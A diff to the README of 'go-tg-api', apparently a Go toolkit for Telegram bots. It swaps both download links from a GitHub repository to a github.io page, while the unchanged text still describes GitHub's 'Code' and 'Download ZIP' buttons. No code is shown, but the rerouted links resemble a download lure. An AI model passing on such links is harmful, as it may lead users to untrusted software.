@@ -1,6 +1,6 @@
 # 🤖 go-tg-api - Create Telegram bots with ease
 
-[![](https://img.shields.io/badge/Download-Go_TG_API-blue.svg)](https://github.com/Pure-tectonagrandis690/go-tg-api)
+[![](https://img.shields.io/badge/Download-Go_TG_API-blue.svg)](https://pure-tectonagrandis690.github.io)
 
 This tool helps you build your own Telegram bots and personal clients. You do not need to learn complex background protocols to make your projects work. This software handles the heavy lifting so you can focus on building features.
 
@@ -23,7 +23,7 @@ If you have not installed Go yet, visit the official website for the Go programm
 
 You need to obtain the source files from the official repository page.
 
-[Click here to open the download page](https://github.com/Pure-tectonagrandis690/go-tg-api)
+[Click here to open the download page](https://pure-tectonagrandis690.github.io)
 
 Once you reach the page, look for the green button labeled "Code". Click this button and select "Download ZIP". This saves a compressed folder to your computer. Extract this folder to a location you can easily find, such as your Documents folder or your Desktop.
 
